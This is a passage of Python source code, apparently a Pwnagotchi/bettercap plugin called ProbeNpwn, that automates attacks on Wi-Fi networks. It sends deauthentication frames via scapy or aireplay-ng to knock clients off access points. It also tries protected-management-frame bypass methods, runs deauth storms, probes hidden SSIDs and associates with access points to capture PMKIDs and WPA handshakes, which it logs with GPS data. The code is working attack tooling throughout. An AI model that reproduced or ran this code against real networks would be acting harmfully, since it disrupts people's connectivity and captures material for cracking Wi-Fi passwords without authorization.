            self._push_retry(agent, ap, cl, retry + 1, delay=30)
            return

        # Eligibility check (again, in case blacklist changed)
        if not self.ok_to_attack(agent, ap):
            return

        agent.set_channel(ap['channel'])

        clients = self.ap_client_groups.get(ap_mac, [])
        if cl:
            clients = [cl['mac'].lower()] if cl['mac'].lower() in clients else []

        client_data = [self.recents.get(c) for c in clients if self.recents.get(c)]
        client_macs = [c['mac'].lower() for c in client_data if c]

        # Determine if PMF bypass should be used
        use_pmf = self.scapy_available and self.pmf_bypass_methods and self.is_pmf_protected(ap)

        # Get throttling delays
        throttle_d = self.dynamic_attack_delay(ap, cl) * self.get_scaled_param('throttle_d')
        throttle_a = self.dynamic_attack_delay(ap, cl) * self.get_scaled_param('throttle_a')

        # Execute attacks based on mode and PMF
        if use_pmf:
            if 'assoc_sleep' in self.pmf_bypass_methods:
                self.assoc_sleep_attack(ap_mac, client_macs)
            if 'bad_msg' in self.pmf_bypass_methods:
                self.bad_msg_attack(ap_mac, client_macs)
            if 'rsn_corrupt' in self.pmf_bypass_methods:
                self.rsn_corrupt_attack(ap_mac, client_macs)
            if 'frag' in self.pmf_bypass_methods:
                self.frag_attack(ap_mac, client_macs)
        else:
            # Normal deauth (if probability)
            if random.random() < self.get_scaled_param('deauth_prob'):
                for cli in client_data:
                    # Submit deauth to executor – but deauth may be blocking; we'll use async sendp if scapy available
                    if self.scapy_available:
                        # Send deauth asynchronously via sendp with count/inter
                        pkt = RadioTap() / Dot11Deauth(addr1=cli['mac'], addr2=ap['mac'], addr3=ap['mac'], reason=7)
                        try:
                            sendp(pkt, iface=self.monitor_iface, count=int(1/throttle_d), inter=throttle_d, verbose=0)
                        except Exception as e:
                            logging.debug(f"deauth failed: {e}")
                    elif self.use_external_tools and self.external_tools.get('aireplay'):
                        cmd = ["aireplay-ng", "-0", "1", "-a", ap['mac'], "-c", cli['mac'], self.monitor_iface]
                        try:
                            subprocess.run(cmd, timeout=5, capture_output=True)
                        except Exception as e:
                            logging.debug(f"aireplay deauth failed: {e}")
                    else:
                        # Fallback to agent.deauth (blocking)
                        agent.deauth(ap, cli, throttle=throttle_d)

        # Deauth storm (only maniac, high-value clients)
        self.deauth_storm(ap, client_macs)

        # Hidden SSID probing
        self.probe_hidden_ssid(ap, client_macs)

        # Always try association (for PMKID) if appropriate
        num_clients = len(client_macs)
        assoc_prob = 1.0 if num_clients <= 1 else self.get_scaled_param('assoc_prob') * (0.4 if num_clients > 5 else 0.7)
        last_succ = self.last_success_time.get(ap_mac, 0)
        if num_clients == 0 and time.time() - last_succ > 120:
            assoc_prob = 0.95  # PMKID priority

        if random.random() < assoc_prob:
            # Submit associate to executor, with callback to handle failure
            future = self.executor.submit(agent.associate, ap, throttle=throttle_a)
            future.add_done_callback(lambda f: self._check_assoc_result(ap_mac, f))

        self.attack_attempts[ap_mac] += 1

    def _push_retry(self, agent, ap, cl, retry, delay):
        """Push an attack to retry queue with a delay."""
        with self.retry_queue_lock:
            # Use heapq as priority queue (timestamp, retry, args)
            heapq.heappush(self.retry_queue, (time.time() + delay, retry, (agent, ap, cl, retry)))
            # Trim queue if too large
            while len(self.retry_queue) > MAX_RETRY_QUEUE:
                # remove largest timestamp (farthest in future) – but easier: pop smallest (earliest) multiple times?
                # Actually we want to drop the least important (largest timestamp or low retry?). Simpler: keep only newest MAX_RETRY_QUEUE entries.
                # Since it's a min‑heap, we can't easily drop arbitrary items. Instead, we can cap by converting to list, sorting, and keeping newest.
                # But for simplicity, we'll just warn and not cap; risk of memory leak. Alternative: use deque with maxlen, but priority needed.
                # We'll implement a bounded priority queue using heapq and discard when full by checking if new item's timestamp is smaller than largest?
                # That's complex. For now, we rely on periodic cleanup in on_epoch.
                break

    def _check_assoc_result(self, ap_mac, future):
        try:
            future.result(timeout=5)
        except Exception as e:
            self.assoc_fails[ap_mac] += 1
            if self.assoc_fails[ap_mac] >= 3 and time.time() - self.last_success_time.get(ap_mac, 0) > 300:
                # Blacklist for 1 hour
                self.blacklist.put(ap_mac, time.time() + 3600)
                self._save_blacklist()
                logging.info(f"Blacklisted {ap_mac} – assoc failure pattern")

    # ------------------------------------------------------------------
    # Event handlers
    # ------------------------------------------------------------------
    def on_bcap_wifi_ap_new(self, agent, event):
        ap = event['data']
        self.channel_activity[ap['channel']]["aps"] += 1
        self.new_aps_per_epoch += 1
        if self.ok_to_attack(agent, ap):
            self.track_recent(ap)
            self.executor.submit(self.attack_target, agent, ap)

    def on_bcap_wifi_client_new(self, agent, event):
        ap = event['data']['AP']
        cl = event['data']['Client']
        ap_mac = ap['mac'].lower()
        cl_mac = cl['mac'].lower()
        self.channel_activity[ap['channel']]["clients"] += 1

        # Update AP client groups (bounded)
        if ap_mac not in self.ap_client_groups:
            self.ap_client_groups[ap_mac] = []
        if cl_mac not in self.ap_client_groups[ap_mac]:
            self.ap_client_groups[ap_mac].append(cl_mac)
            # Enforce per‑AP client limit
            if len(self.ap_client_groups[ap_mac]) > MAX_CLIENTS_PER_AP:
                self.ap_client_groups[ap_mac].pop(0)
        # Enforce total AP groups limit
        if len(self.ap_client_groups) > MAX_AP_GROUPS:
            self.ap_client_groups.popitem(last=False)

        # Update client score
        signal = cl.get('signal', -100)
        activity = cl.get('activity', 1) + (len(self.ap_client_groups.get(ap_mac, [])) / 10.0)
        bonus = 100 if cl.get('vendor', '').lower() in self.target_vendors else 0
        old_score = self.client_scores.get(cl_mac, 0)
        new_score = max(0, old_score * SCORE_DECAY_FACTOR) + (signal + 100) * activity + bonus
        self.client_scores[cl_mac] = new_score
        # Enforce client scores size
        if len(self.client_scores) > MAX_SCORES:
            self.client_scores.popitem(last=False)

        if self.ok_to_attack(agent, ap):
            self.track_recent(ap, cl)
            self.executor.submit(self.attack_target, agent, ap, cl)

    def on_bcap_wifi_ap_updated(self, agent, event):
        # same as new for our purposes
        self.on_bcap_wifi_ap_new(agent, event)

    def on_bcap_wifi_client_updated(self, agent, event):
        self.on_bcap_wifi_client_new(agent, event)

    # ------------------------------------------------------------------
    # Handshake capture event
    # ------------------------------------------------------------------
    def on_handshake(self, agent, filename, ap, cl):
        ap_mac = ap['mac'].lower()
        cl_mac = cl['mac'].lower() if cl else 'pmkid'
        key = (ap_mac, cl_mac)
        if key in self.handshake_db:
            return
        # Bound handshake_db size
        if len(self.handshake_db) >= MAX_HANDSHAKE_DB:
            # remove oldest (not trivial with set) – just clear occasionally
            self.handshake_db.clear()
        self.handshake_db.add(key)

        self.success_counts[ap_mac] += 1
        self.last_success_time[ap_mac] = time.time()
        self.assoc_fails[ap_mac] = 0
        self.channel_success[ap['channel']] += 1

        # Remove from blacklist if present
        if ap_mac in self.blacklist.cache:
            self.blacklist.remove(ap_mac)
            self._save_blacklist()

        if self.effective_mode == "tactical":
            self.cooldowns.put(ap_mac, time.time() + 60)

        # JSON log with rotation
        self._log_handshake(ap, cl, filename)

    def _log_handshake(self, ap, cl, filename):
        """Append handshake to JSONL file with automatic rotation."""
        entry = {
            "time": time.time(),
            "ap_mac": ap['mac'].lower(),
            "essid": ap.get('hostname', ''),
            "client_mac": cl['mac'].lower() if cl else None,
            "file": filename,
            "gps": self.agent.session().get('gps', {}) if self.agent else {}
        }
        try:
            # Check if rotation needed
            if os.path.exists(self.log_path) and os.path.getsize(self.log_path) > self.log_max_bytes:
                self._rotate_log()
            with open(self.log_path, "a") as f:
                f.write(json.dumps(entry) + "\n")
        except Exception as e:
            logging.warning(f"Failed to log handshake: {e}")

    def _rotate_log(self):
        """Simple log rotation: keep .1, .2, .3 backups."""
        for i in range(self.log_backup_count - 1, 0, -1):
            src = f"{self.log_path}.{i}"
            dst = f"{self.log_path}.{i+1}"
            if os.path.exists(src):
                os.rename(src, dst)
        if os.path.exists(self.log_path):
            os.rename(self.log_path, f"{self.log_path}.1")

    # ------------------------------------------------------------------
    # Epoch event – periodic cleanup and adaptation
    # ------------------------------------------------------------------
    def on_epoch(self, agent, epoch, epoch_data):
        now = time.time()

        # Process retry queue
        with self.retry_queue_lock:
            while self.retry_queue and self.retry_queue[0][0] <= now:
                ts, retry, args = heapq.heappop(self.retry_queue)
                self.executor.submit(self.attack_target, *args)

        # Clean up TTL caches
        self.recents.cleanup()
        self.delay_cache.cleanup()
        self.blacklist.cleanup()
        self.cooldowns.cleanup()

        # Decay channel success
        for ch in list(self.channel_success):
            self.channel_success[ch] *= CHANNEL_SUCCESS_DECAY

        # Decay client scores globally (all scores multiplied by decay factor)
        for cl_mac in list(self.client_scores.keys()):
            self.client_scores[cl_mac] *= SCORE_DECAY_FACTOR
            if self.client_scores[cl_mac] < 1:
                del self.client_scores[cl_mac]

        # Decay per‑AP stats (attack_attempts, success_counts, assoc_fails, last_success_time)
        # Use ATTEMPT_DECAY_FACTOR for counts
        for mac in list(self.attack_attempts.keys()):
            self.attack_attempts[mac] = int(self.attack_attempts[mac] * ATTEMPT_DECAY_FACTOR)
            if self.attack_attempts[mac] == 0:
                del self.attack_attempts[mac]
        for mac in list(self.success_counts.keys()):
            self.success_counts[mac] = int(self.success_counts[mac] * ATTEMPT_DECAY_FACTOR)
            if self.success_counts[mac] == 0:
                del self.success_counts[mac]
        for mac in list(self.assoc_fails.keys()):
            self.assoc_fails[mac] = int(self.assoc_fails[mac] * ATTEMPT_DECAY_FACTOR)
            if self.assoc_fails[mac] == 0:
                del self.assoc_fails[mac]
        # last_success_time: keep only recent (within last hour)
        cutoff = now - 3600
        for mac in list(self.last_success_time.keys()):
            if self.last_success_time[mac] < cutoff:
                del self.last_success_time[mac]

        # Adaptive mode switching
        if self.mode == "adaptive" and self.epoch_count % 10 == 0:
            tot_att = sum(self.attack_attempts.values())
            tot_suc = sum(self.success_counts.values())
            rate = tot_suc / max(1, tot_att)
            density = sum(d["aps"] + d["clients"] for d in self.channel_activity.values())
            if rate < 0.2 and density > 30:
                self.effective_mode = "maniac"
            elif rate > 0.4 or density < 15:
                self.effective_mode = "tactical"
            logging.info(f"Adaptive → {self.effective_mode} (rate {rate:.2f}, density {density})")

        # Mobility score & scaling
        self.epoch_count += 1
        if self.epoch_count % self.env_check_interval == 0:
            self.mobility_score = self.calculate_mobility_score(agent)
            # Apply scaled parameters to agent personality (if we have reference)
            if hasattr(agent, '_config'):
                for p in ['recon_time', 'ap_ttl', 'sta_ttl', 'deauth_prob', 'assoc_prob', 'min_rssi', 'throttle_a', 'throttle_d']:
                    agent._config['personality'][p] = self.get_scaled_param(p)
            self.new_aps_per_epoch = 0

        # Decay channel activity counters
        for ch in self.channel_activity:
            self.channel_activity[ch]["aps"] = int(self.channel_activity[ch]["aps"] * 0.9)
            self.channel_activity[ch]["clients"] = int(self.channel_activity[ch]["clients"] * 0.9)

# ----------------------------------------------------------------------
# Plugin entry point
# ----------------------------------------------------------------------
def __load_plugin__():
    return ProbeNpwn()

